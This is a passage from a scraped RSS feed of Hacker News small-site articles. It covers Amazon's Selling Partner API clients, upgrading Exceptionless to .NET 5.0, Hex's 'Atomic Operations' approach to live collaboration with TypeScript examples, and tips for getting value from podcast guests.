<p>Amazon has released Java and C# clients for the Selling Partner API. MWS has Java, C#, and PHP clients, so I would not be surprised to see a PHP client for SP sometime soon. The Java and C# clients use <a href="https://swagger.io/tools/swagger-codegen/">Swagger code generation</a> (with <a href="https://github.com/amzn/selling-partner-api-models">these endpoint models</a>), so it should be relatively straightforward to implement SP clients in any other language that Swagger can target.</p>
<p>Once Amazon releases v1 of the Selling Partner API, I‚Äôll post an article that guides you through making your first SP application. Stay tuned by signing up for my newsletter below! And as always, please email me if you have any questions. I‚Äôd love to hear from you.</p>


<p>(Also, I help Amazon sellers increase their sales via MWS‚Äïif you‚Äôre interested in upgrading your selling infrastructure, shoot me a line at <a href="mailto:jesse@jesseevers.com">jesse@jesseevers.com</a>.)</p>
<hr>

<p><sup><a id="fn.1" href="#fnr.1">1</a></sup> I originally wrote:</p>
<blockquote>
  <p>MWS is an XML-RPC API, a design that largely fell by the wayside as RESTful APIs became increasingly popular in the last decade.</p>
</blockquote>
<p>After doing more research on the true definitions of XML-RPC and RESTful APIs, I found that comparing the two creates a false dichotomy, since XML-RPC is a protocol and RESTful implies a certain set of constraints (but does not specify any implementation).</p>
<p><sup><a id="fn.2" href="#fnr.2">2</a></sup> For a refresher on the actions indicated by each HTTP verb, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">check out MDN</a>.</p>
<p><sup><a id="fn.3" href="#fnr.3">3</a></sup> IAM, or Identity and Access Management, is AWS‚Äôs service for managing roles and permissions for Amazon services. Lots more information <a href="https://aws.amazon.com/iam/">here</a>.</p>

        
      </section>

      

      

      
  

    </div></div>]]>
            </description>
            <link>https://jesseevers.com/new-amazon-seller-api/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580022</guid>
            <pubDate>Thu, 24 Sep 2020 16:05:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pulling up on the death spiral of price drops]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579987">thread link</a>) | @iamwil
<br/>
September 24, 2020 | https://automationcookbook.io/pulling-up-on-the-death-spiral-of-price-drops/ | <a href="https://web.archive.org/web/*/https://automationcookbook.io/pulling-up-on-the-death-spiral-of-price-drops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://automationcookbook.io/pulling-up-on-the-death-spiral-of-price-drops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579987</guid>
            <pubDate>Thu, 24 Sep 2020 16:03:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Upgrading a production app to .NET 5.0 RC-1]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579969">thread link</a>) | @jhunter1016
<br/>
September 24, 2020 | https://exceptionless.com/why-we-upgraded-our-production-application-to-net-5-0/ | <a href="https://web.archive.org/web/*/https://exceptionless.com/why-we-upgraded-our-production-application-to-net-5-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
<p>For anyone who has built an application, you‚Äôve probably built it on some library or framework that changes over time. To keep up, you have to upgrade your application. However, there are varying schools of thought around when you should upgrade. At&nbsp;<a href="https://exceptionless/">Exceptionless</a>, we like to be on the bleeding edge. As an open-source company, we feel a responsibility to the community to know and understand the open-source tools we use. As such, we have already upgraded Exceptionless to use .NET 5.0.</p>



<p>To give you a little background, .NET 5.0 was&nbsp;<a href="https://devblogs.microsoft.com/dotnet/introducing-net-5/">introduced in May of 2019</a>. The announcement was a big one as Microsoft chose to drop the .NET Core distinction. Going forward, we will just see cross-platform support in the form of ‚Äú.NET X.X‚Äù. The first release candidate for .NET 5.0 was&nbsp;<a href="https://devblogs.microsoft.com/dotnet/announcing-net-5-0-rc-1/">announced September 13, 2020</a>. We chose to upgrade and begin using .NET 5.0 immediately. That decision was driven by Microsoft‚Äôs commitment to supporting production usage of the rc1 release. And as it turned out, the upgrade process was not too painful at all.</p>



<p>All in, the upgrade took about one hour and was a very small commit. You can actually&nbsp;<a href="https://github.com/exceptionless/Exceptionless/commit/874f08e70a3ded2762f8d34df0378de38d7a3193">see the commit here</a>. This is really a testament to the foundation we‚Äôve built here combined with the long-running foundation Microsoft has built with the .NET framework. Exceptionless is no small application and yet we were able to upgrade to an early release candidate in order to capitalize on new capabilities. To highlight the scale of Exceptionless and the relatively minor impact the upgrade process had, let‚Äôs take a look at some of our numbers.</p>



<ul><li>1.4 TB Elasticsearch Cluster</li><li>173M Elasticsearch Documents</li><li>384M Redis Operations/Day</li><li>122M HTTP Requests/Day</li><li>2,476 GitHub Stars</li><li>568 GitHub Forks</li></ul>



<p>There are always multiple schools of thought around running pre-release code on production applications, but for us, the decision was a no-brainer. The top motivators were performance improvements, availability of new C# features, and Docker improvements for our self-hosted solution.</p>



<h2>Performance Improvements</h2>



<p>We are a developer tool, and as such, performance is important. .NET 5.0 allows us to leverage the performance boosts associated with the upgrade and pass that along to our customers and the community around us. We compared our memory and performance from .NET Core 3.1 to the .NET 5.0 rc-1 release and saw enough gains to help support our decision to move forward with rolling this out to production.</p>



<p>The .NET team‚Äôs focus on pushing the boundaries of garbage collection was an important factor for us. GC is such a critical component to performance, and it impacts almost everything within the framework. We were excited to see the&nbsp;<a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-5/#gc">focus Microsoft put on continuing to improve performance</a>&nbsp;in this area and felt the gains were enough to really tilt us towards our production release of Exceptionless using .NET 5.0.</p>



<p>As a quick, visual example, of other improvements, here‚Äôs a table Ben Adams tweeted that gives us glimpse into the performance gains of .NET 5.0 over .NET 3.1: </p>



<figure></figure>



<h2>New C# Features</h2>



<p>With the release of C# 9, we, once again, get significant improvements. Anytime a programming language releases new features, it‚Äôs important to ask yourself whether those features are necessary for your application. In the case of C# 9, there are multiple features we believe will help improve the code legibility, overall codebase size, and ultimately performance. It always comes back to performance!</p>



<p>Pattern matching in C# 9 is a feature we are particularly excited about. If you‚Äôre interested in a deep dive into the improvements here,&nbsp;<a href="https://anthonygiretti.com/2020/06/23/introducing-c-9-improved-pattern-matching/">Anthony Giretti has a great post</a>&nbsp;highlighting the new functionality. For Exceptionless, pattern matching represents a better way for us to execute logical operations we already support. In doing so, we can reduce code complexity, improve performance, and deliver a better experience.</p>



<p>Records are an exciting new feature in C# 9 as well. Data immutability is important, once again, for‚Äîyou guessed it‚Äîperformance. The way&nbsp;<a href="https://daveabrock.com/2020/07/06/c-sharp-9-deep-dive-records">Dave Brock puts it</a>&nbsp;on his blog is apt:</p>



<blockquote><p>Immutable types reduce risk, are safer, and help to prevent a lot of nasty bugs that occur when you update your object.</p></blockquote>



<p>Data records give us immutability in the form of a dedicated struct. Rather than extending the functionality of C#‚Äôs existing structs, records give us the ability to reach for a data-specific type that offers built-in immutability.</p>



<h2>Docker Improvements</h2>



<p>We are proud of our open-source roots. We want to make self-hosting Exceptionless as easy as possible, and Docker has made this a reality. Our Docker image is the fastest and easiest way to get started with self-hosting and .NET 5.0 only improves the Docker experience.</p>



<p>.NET 5.0 enables better resource compaction which, in turn, reduces the cost associated with Docker images. This is important to the bottom line, but .NET 5.0‚Äôs improvements go beyond dollar-savings with Docker. The new features also improve memory constraints which‚Äîsay it with me now‚Äîimprove performance.</p>



<p>One additional benefit of the .NET 5.0 rc-1 release candidate is how our Docker image now works better with Kubernetes resource constraints. We‚Äôre pretty big fans of Docker and Kubernetes, so anything to improve the experience around both is a win in our eyes.</p>



<h2>Conclusion</h2>



<p>We took an early release candidate from a massive framework and rolled it out to production almost immediately after it was announced. Are we crazy? We don‚Äôt think so, but you decide.</p>
              </div></div>]]>
            </description>
            <link>https://exceptionless.com/why-we-upgraded-our-production-application-to-net-5-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579969</guid>
            <pubDate>Thu, 24 Sep 2020 16:02:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Pragmatic Approach to Live Collaboration]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579935">thread link</a>) | @maclockard
<br/>
September 24, 2020 | https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration | <a href="https://web.archive.org/web/*/https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>At <a href="https://hex.tech/" target="_blank" rel="nofollow">Hex</a>, we're all about making data workflows more collaborative. Our product allows users to connect to data, build analyses with Python and SQL, and turn them into interactive apps anyone can use.</p><p>The backing "Logic View" of a Hex project is powered by a notebook-style interface, similar in spirit to products like Mathematica or Jupyter. From early on, we wanted to support live multi-user editing in this Logic View so users can review or assist each other with their work.</p><figure>
    <span>
      <span></span>
  <img alt="Our Logic view: a notebook-style interface" title="Our Logic view: a notebook-style interface" src="https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/b38af/hex_logic_view.png" srcset="https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/ccb66/hex_logic_view.png 185w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/3ac6e/hex_logic_view.png 370w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/b38af/hex_logic_view.png 740w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/ffc38/hex_logic_view.png 1110w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/0ff2a/hex_logic_view.png 1138w" sizes="(max-width: 740px) 100vw, 740px" loading="lazy">
    </span>
    <figcaption>Our Logic view: a notebook-style interface</figcaption>
  </figure><p>Our team evaluated several options, and wound up pursuing a pragmatic approach which we were able to implement for our entire application in less than six weeks. We are excited to share some details for others who might be thinking through similar decisions.</p><h2>State of the Art</h2><p>There are two dominant approaches to multi-user collaboration today: <strong>Operational Transforms</strong> and <strong>Conflict-free Replicated Data Types</strong>. Both are powerful, although they come with trade-offs that make implementation challenging, particularly for smaller teams like ours. There is also a lesser-known hybrid approach‚Äîoriginally pioneered by Figma‚Äîgeared towards ease of implementation.</p><h3>Operational Transforms</h3><p><a href="https://en.wikipedia.org/wiki/Operational_transformation" target="_blank" rel="nofollow">Operational Transforms</a> (OT) has been around for years. This technology is famously used to back Google Docs, and there are a number of reference implementations available on the web.</p><div><div><p><strong>The basic idea of OT</strong> is to decompose all state mutations to specific operations.</p><p>As an example, let's say we want two editors to simultaneously edit the string <code>ello</code>. Editor 1 sends an operation that inserts <code>!</code> at position 4 (or <code>[!, 4]</code> for short) and Editor 2 sends another operation that inserts <code>H</code> at position 0 (or <code>[H, 0]</code>).</p><p>If received in this order, a client can process these operations as they are and get the desired text <code>Hello!</code>. However, if a client were to receive <code>[H, 0]</code> first and <code>[!, 4]</code> second, the resulting string would be the incorrect <code>Hell!o</code>. OT implementations need to account for this, and implement a transformation to correct or "transform" the second operation to <code>[!, 5]</code> in order to preserve the user's intent and get <code>Hello!</code>.</p></div></div><p>In order to properly broker operations between clients, OT requires a centralized server, which may not be acceptable for all use cases.</p><p>OT offers a lot of control to the developer over how user actions are de-conflicted, making it easy to preserve user intent and context.</p><p>The "transform" part, however, can be quite tricky and error-prone since an implementor needs to account for each pair of operations. The number of possible combinations grows quadratically with the number of operations, meaning even with extensive testing it's possible to miss an edge case. This combinatorial complexity means an application gets harder and harder to reason about over time. <sup id="fnref-1"><a href="#fn-1">1</a></sup></p><h3>Conflict-free Replicated Data Types</h3><p><a href="https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type" target="_blank" rel="nofollow">Conflict-free Replicated Data Types</a> (CRDTs) are a newer alternative that sidesteps much of the complexity that burdens OT.</p><div><div><p><strong>The basic idea of CRDT</strong> is to use data structures that are inherently (you guessed it) conflict-free.</p><p>There are <a href="https://github.com/pfrazee/crdt_notes/tree/68c5fe81ade109446a9f4c24e03290ec5493031f#portfolio-of-basic-crdts" target="_blank" rel="nofollow">several different CRDTs</a>, each with their own implementation details. An example CRDT is a <a href="https://www.baeldung.com/java-conflict-free-replicated-data-types#grow-only-set" target="_blank" rel="nofollow">Grow Only Set</a>, which can only have elements added to it, but never removed. Conflicts are avoided since it is impossible to add/remove an item at the same time.</p><p>A multiplayer application can compose different types of CRDTs to create more complex structures for modeling its state.</p></div></div><p>CRDTs avoid the combinatorial complexity that comes along with OT, and also enable direct client-to-client communication, removing the need for a central server. Despite these advantages, they still have major trade-offs.</p><p>While CRDTs are correct from a mathematical standpoint, they might not have the correct semantics for a specific application. For example, the result of a state mutation is always consistent, but it may not be exactly what was expected since it's possible to lose user intent. <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>CRDTs also trade off the complexity of resolving conflicts for a more challenging initial implementation, due to their reliance on algorithms like <a href="https://en.wikipedia.org/wiki/Vector_clock" target="_blank" rel="nofollow">vector clocks</a>. They also incur a fair amount of storage overhead‚Äîwhile there is <a href="https://www.youtube.com/watch?v=x7drE24geUw&amp;feature=youtu.be&amp;t=3198" target="_blank" rel="nofollow">progress being made</a>, avoiding this problem requires foresight and cleverness. And since CRDTs are newer, there are fewer reference implementations. <sup id="fnref-3"><a href="#fn-3">3</a></sup></p><h3>Figma's Hybrid Approach</h3><p>While at first we considered OT and CRDTs as our two main options, we were intrigued by <a href="https://www.figma.com/blog/how-figmas-multiplayer-technology-works/" target="_blank" rel="nofollow">the pragmatic approach taken by Figma</a>. They borrowed some ideas from CRDTs, like a <a href="https://github.com/pfrazee/crdt_notes/tree/68c5fe81ade109446a9f4c24e03290ec5493031f#last-writer-wins-register-lww-register" target="_blank" rel="nofollow">last-writer-wins data register</a>. Instead of using vector clocks to provide an ordering guarantee, however, they used a central authority, similar to OT.</p><p>By using the best parts of both OT and CRDTs, Figma avoided challenges with de-conflicting operations and difficulty of implementation. The main trade-off is that certain functionality, such as multi-user editable text strings, is not easily supported.</p><p>Figma's hybrid technique resonated with us as being both practical and elegant, although it was surprising that we couldn't find examples of others pursuing a similar approach. <sup id="fnref-4"><a href="#fn-4">4</a></sup></p><p>
  <video src="https://hex.tech/images/blog/figma-multiplayer.mp4" preload="auto" muted="" loop="" playsinline="" webkit-playsinline="" x5-playsinline="" autoplay="">
  </video>
<figcaption>From Figma's Blog Post</figcaption></p><h2>Choosing a Path</h2><p>As we assessed our options, we weighed a few key factors:</p><h3>Taking it step by step</h3><p>It was important to us that our solution was <a href="https://hex.tech/blog/incremental-shipping" target="_blank" rel="nofollow">shippable incrementally</a> and completable within a reasonable time frame. Any solution that required rewriting significant parts of our code base all at once, or a "big bang" cutover, would have not been acceptable.</p><h3>Our current stack</h3><p>Some existing multiplayer frameworks, such as <a href="https://github.com/share/sharedb" target="_blank" rel="nofollow">ShareDB</a>, require storing the model in a specific format and shape, or that the frontend connects to the model in a particular way.</p><p>We wanted to avoid major changes like this. An ideal solution would need to work well with our current tools, including:</p><ul>
<li><a href="https://www.apollographql.com/docs/" target="_blank" rel="nofollow">Apollo + GraphQL</a> to build an API schema shared by our frontend and backend services</li>
<li><a href="https://graphql-code-generator.com/" target="_blank" rel="nofollow">GraphQL Code Generator</a> and Typescript to ensure type safety across the entire stack</li>
<li><a href="https://www.apollographql.com/docs/react/" target="_blank" rel="nofollow">Apollo Client</a> on the frontend to store requested data in a normalized object cache that allows React to intelligently subscribe to changes</li>
<li>PostgreSQL and relational database patterns/features like normalization, constraints, and transactions to help guarantee data consistency and correctness</li>
</ul><p>This stack strikes a good balance between feature velocity and stability, and we wanted to build on top of it‚Äînot replace it.</p><h3>Controlling our destiny</h3><p>As we considered these approaches, we evaluated a number of open source libraries. We're generally enthusiastic about adopting and contributing to OSS, and originally thought to do so here.</p><p>While there are some great projects out there, like <a href="https://github.com/automerge/automerge" target="_blank" rel="nofollow">Automerge</a> and <a href="https://github.com/yjs/yjs" target="_blank" rel="nofollow">Y.js</a>, it can be risky to outsource something as core as our application state. Even really promising projects can lose momentum: <a href="https://github.com/Operational-Transformation/ot.js/" target="_blank" rel="nofollow">ot.js</a>, for example, is an Operational Transform library with over 1.2k stars on Github, but is no longer under active development and is looking for a maintainer.</p><h2>Atomic Operations</h2><p>After considering our options, we pursued an approach inspired by Figma's hybrid solution. We call it <strong>Atomic Operations (AO),</strong> as all edits to application state are broken down to their smallest <em>atomic</em> parts.</p><p>For us, this technique struck the right balance between ease of implementation, compatibility with our stack, and control over the application foundations.</p><p><span>
      <span></span>
  <img alt="splitting atom" title="splitting atom" src="https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/b38af/splitting-atom.png" srcset="https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/ccb66/splitting-atom.png 185w, https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/3ac6e/splitting-atom.png 370w, https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/b38af/splitting-atom.png 740w" sizes="(max-width: 740px) 100vw, 740px" loading="lazy">
    </span></p><h3>Splitting the Atom</h3><p>AO mutations exist at the single property update level, such that <strong>two operations of different types cannot conflict with each other.</strong></p><p>It is, however, still possible for two operations of the <em>same type</em> to conflict. This is determined by an operation's <code>conflictId</code>, which is a concatenation of its type and the ID of the object being edited. <sup id="fnref-5"><a href="#fn-5">5</a></sup> Since we use last-writer-wins semantics, we don't merge conflicts, we just pick a winner.</p><p>For determining which operation is "last", the server keeps track of a monotonically increasing counter per object that increments with each write. Upon acknowledging an operation, the server includes the latest value of this counter. To determine which operation is a winner, the client simply chooses the operation with the higher value. A central authority is required to implement this monotonic counter, prohibiting any distributed implementations.</p><p>As an example, take a hypothetical object type "foobar":</p><div data-language="typescript"><pre><code><span>interface</span> <span>Foobar</span> <span>{</span>
  id<span>:</span> <span>string</span>
  name<span>:</span> <span>string</span>
  color<span>:</span> <span>string</span>
<span>}</span></code></pre></div><p>Here are some examples of atomic operations for creating and editing a foobar:</p><div data-language="typescript"><pre><code><span>{</span>
  <span>type</span><span>:</span> <span>"CREATE_FOOBAR"</span><span>,</span>
  conflictId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    name<span>:</span> <span>"My new foobar"</span><span>,</span>
    color<span>:</span> <span>"#DE1738"</span>
  <span>}</span>
<span>}</span>

<span>{</span>
  <span>type</span><span>:</span> <span>"SET_FOOBAR_COLOR"</span><span>,</span>
  conflictId<span>:</span> <span>"SET_FOOBAR_COLOR-123ABC"</span><span>,</span>
  creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    newColor<span>:</span> <span>"#0B6623"</span>
  <span>}</span>
<span>}</span></code></pre></div><p>Again: by breaking down all edits to a foobar object to changing individual properties, we remove the need to worry about how different operations might merge‚Äî<strong>at this level of granularity, only one write <em>can</em> win.</strong></p><p>A nice benefit of this decomposition is that all mutations to state are described by plain objects. A keen eye might note some parallels with how <a href="https://redux.js.org/basics/actions" target="_blank" rel="nofollow">Redux defines actions</a>, and indeed AO similarly benefits from making state mutations predictable, transparent, and easily testable.</p><p>Finally, we implemented undo / redo by requiring all atomic operation to include an additional operation that can undo the change. As an example:</p><div data-language="typescript"><pre><code><span>{</span>
  <span>type</span><span>:</span> <span>"SET_FOOBAR_NAME"</span><span>,</span>
  conflictId<span>:</span> <span>"SET_FOOBAR_NAME-123ABC"</span><span>,</span>
  creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    newName<span>:</span> <span>"My slightly less new foobar"</span>
  <span>}</span><span>,</span>
  undo<span>:</span> <span>{</span>
    <span>type</span><span>:</span> <span>"SET_FOOBAR_NAME"</span><span>,</span>
    conflictId<span>:</span> <span>"SET_FOOBAR_NAME-123ABC"</span><span>,</span>
    creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
    payload<span>:</span> <span>{</span>
      id<span>:</span> <span>"123ABC"</span><span>,</span>
      newName<span>:</span> <span>"My new foobar"</span> 
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span></code></pre></div><h3>Getting fractional</h3><p>A drawback of AO is that certain types of mutations can be difficult to express as simple last-writer-wins operations.</p><p>One such case is ordered collections. With classic integer indexing of a collection, ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration">https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration</a></em></p>]]>
            </description>
            <link>https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579935</guid>
            <pubDate>Thu, 24 Sep 2020 16:00:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get More from Your Podcast Guests]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579892">thread link</a>) | @tomhuntio
<br/>
September 24, 2020 | https://blog.bcast.fm/podcast-guests/ | <a href="https://web.archive.org/web/*/https://blog.bcast.fm/podcast-guests/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Podcast guests are great...</p><p>They introduce your audience to a whole new perspective, can entertain and inspire. We all know that.</p><p>That said, few podcasters maximise the true value of their guests. <strong>This is post aims to change that.</strong></p><p>Over the past five years, our team has worked with HUNDREDS podcasters and thousands of guests... we've seen partnerships made, deals closed and lifelong friendships formed through podcast interviews.</p><p>We also surveyed the bCaster community: <a href="https://www.facebook.com/groups/profitablepodcastshq">Profitable Podcasts</a> and have come up with the biggest and best list of methods you can use to get more from your guests.</p><p>So read through and choose JUST one to implement with your next guest... you never know what may happen ;)</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-1.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-1.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-1.png 1000w, https://blog.bcast.fm/content/images/2020/09/image-1.png 1232w" sizes="(min-width: 720px) 720px"></figure><p>This is now widely accepted in the podcast space... you jump on a podcast as a guest, you share afterwards.</p><p>This immediately gets you, your business and your podcast exposed to the guest of that audience. bCast will send each guest an email when the episode goes live with share links to the major social platforms.</p><p>If you don't use bCast... do this yourself ;)</p><h3 id="2-feedback-on-your-podcast"><strong>2 ‚Äî Feedback On Your Podcast</strong></h3><p>This is a no-brainer.</p><p>If your podcast is going to thrive in the coming months and years, you need to get better.</p><p>You get better by:</p><ol><li>Understanding what to improve</li><li>Improving it</li></ol><p>A REALLY good way to understand what to improve is to get honest feedback from the people that have experienced your podcast process - your guests.</p><p>You want to ask:</p><ul><li>Is there anything I can improve about the booking process?</li><li>Is there anything I can improve in the questions?</li><li>Is there anything I can improve on as the host?</li></ul><p>If you do this with every guest, soon your podcast will be a will oiled machine, lead generating, attention machine :)</p><h3 id="3-get-the-backlink"><strong>3 ‚Äî Get The Backlink</strong></h3><p>This is more rare...</p><p>Your site will only rank in Google for keywords if you get other relevant and authoritative sites in your niche to link to you. And who better than your podcast guests?</p><p>There are two ways we can do this:</p><ul><li>If the guest has a press/interview list, then simply ask to be included:</li></ul><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-2.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-2.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-2.png 1000w, https://blog.bcast.fm/content/images/size/w1600/2020/09/image-2.png 1600w, https://blog.bcast.fm/content/images/2020/09/image-2.png 1924w" sizes="(min-width: 720px) 720px"></figure><ul><li>If the guest has a blog, offer to write up a summary for them to post and include a link back to your site:</li></ul><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-3.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-3.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-3.png 1000w, https://blog.bcast.fm/content/images/2020/09/image-3.png 1480w" sizes="(min-width: 720px) 720px"></figure><p>If they don't do either of these, then offer to link from an article of yours, with them linking back to your interview from an article of theirs.</p><p>And BOOM ‚Äî you're getting a backlink with each episode.</p><h3 id="4-guest-referral"><strong>4 ‚Äî Guest Referral</strong></h3><p>This is a simple one.</p><p>Good guests will know other good guests, it's a simple as asking the guest post interview if they know anyone they think would be a good fit. Then you just reach out to the new person saying:</p><blockquote> "X mentioned that you would be an awesome podcast guest... shall I share more info? ;)</blockquote><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-8.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-8.png 600w, https://blog.bcast.fm/content/images/2020/09/image-8.png 988w" sizes="(min-width: 720px) 720px"></figure><p>The ninja trick here is to include the referral IN THE INTERVIEW itself with a question like:</p><blockquote>Who is one person within [[podcast niche]] that you would LOVE to take to lunch?</blockquote><p>As now, you can reach out to that person asking them to be a guest AND share the interview where they have been featured.</p><h3 id="5-intro-to-the-right-person"><strong>5 ‚Äî Intro To The Right Person</strong></h3><p>Personal intros are effective.</p><p>They essentially say:</p><blockquote>This person is safe to work with, I approve of them.</blockquote><p>And this can be MASSIVE in sales process. Your competitor may be bigger, better funded and have a better brand than you. But if they don't have an intro, you'll be the first to get the meeting.</p><p>So if there is someone within the network or business of your guest, don't be afraid to simply ask:</p><blockquote>Hey, would you be happy to introduce me to X? It would be great to talk to him about Y.</blockquote><p>When you're in the post podcast interview love bubble, this request will get a 90% success rate.</p><h3 id="6-move-down-the-sales-process"><strong>6 ‚Äî Move Down The Sales Process</strong></h3><p>This is the holy grail.</p><p>We've had <a href="https://fame.so/">Fame</a> clients start a podcast with us and have their first guest reach out asking to buy their product:</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-5.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-5.png 600w, https://blog.bcast.fm/content/images/2020/09/image-5.png 874w" sizes="(min-width: 720px) 720px"></figure><p>Obviously that is the ideal set up, but most of the time it doesn't happen like that ‚Äî you need to seamlessly move your guests down that process.</p><p>How?</p><p>Well first we must ask... what is a VERY low commitment and relevant step that you can take with your guest towards solving their problem post interview?</p><p><em>Note that I say... only if they have a problem you can solve. If they don't have a problem you can solve then there is no point in trying to sell to them.</em></p><p>This could be:</p><ul><li>A free trial</li><li>A strategy session</li><li>An audit</li></ul><p>Anything that adds value but will also move the guest down through your sales process, it must be:</p><ol><li>Free</li><li>Better than what is publicly available</li></ol><p>If you do this right, and you add value with this step - you will be one step closer to converting from guest, to customer.</p><h3 id="7-promote-your-product"><strong>7 ‚Äî Promote Your Product</strong></h3><p>Now not every podcast guest will be a perfect customer.</p><p>But what I can say is that most guests will be either a perfect customer or a perfect partner. E.g. they will either be able to buy your product or will have an audience or a network of people that could buy your product.</p><p>So if they have the latter, the same process as #6 applies ‚Äî what is the next step you need to take with them to forming a partnership with the guest?</p><p>The guest may:</p><ul><li>Introduce you to relevant contacts in exchange for a one off fee</li><li>Promote your product to their audience in exchange for a commission</li><li>White label your service whilst paying you a monthly subscription</li></ul><p>Normally the next step post interview is to set up another chat to see how you could help each other...</p><h3 id="8-feedback-on-your-product"><strong>8 ‚Äî Feedback On Your Product</strong></h3><p>Now if you don't want to move a guest down the sales or partnership process - the least you can do is maybe get their feedback on what you're trying to do right?</p><p>For this, simply ask the guest post interview for 15 minutes of their time so you can ask them a few questions about your niche and for them to review your product/service.</p><p>80% will agree and you never know... if your product truly solves a problem they have, they may even move into the sales process anyway ;)</p><p>This is a no-brainer.</p><p>We advise clients and bCast users to create a community around their podcast:</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-6.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-6.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-6.png 1000w, https://blog.bcast.fm/content/images/size/w1600/2020/09/image-6.png 1600w, https://blog.bcast.fm/content/images/2020/09/image-6.png 2056w" sizes="(min-width: 720px) 720px"></figure><p>It's great to bring the guests in there to answer questions about their episode to add more value to your audience.</p><p>Maybe the guests will get elevated status in the community, such as a Moderator in a Facebook Group or you will link out to their content from the pinned post.</p><h3 id="10-gain-a-testimonial"><strong>10 ‚Äî Gain A Testimonial</strong></h3><p>Few people use this one...</p><p>But you when you are trying to book a guest you are selling. You are selling them your audience and exposure and you are buying their time.</p><p>So when you normally sell something, you normally include a testimonial from someone else that has taken that risk.</p><p>So why not do this with your guests?</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-4.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-4.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-4.png 1000w, https://blog.bcast.fm/content/images/size/w1600/2020/09/image-4.png 1600w, https://blog.bcast.fm/content/images/2020/09/image-4.png 2270w" sizes="(min-width: 720px) 720px"></figure><p>Again, remember when you reach out to a guest to bring them onto your podcast ‚Äî you are selling.</p><p><em>What is another trick sales people use when selling?</em></p><p>Social proof.</p><p>When you get a big name guest, use their name or their businesses name in your outreach or conversations with new potential guests.</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-9.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-9.png 600w, https://blog.bcast.fm/content/images/2020/09/image-9.png 982w" sizes="(min-width: 720px) 720px"></figure><p>This reduces risk of them as they think:</p><blockquote>Well if X did this podcast, then it must be good enough for me!</blockquote><hr><p>Alright...</p><p><em>Have you chosen the one you will implement?</em></p><p>If not, go back through the post and select one ‚Äî implement this on your next guest and start the ball rolling towards a more profitable podcast.</p><p>Once implemented, jump <a href="https://www.facebook.com/groups/profitablepodcastshq">into the community</a> or hit us up 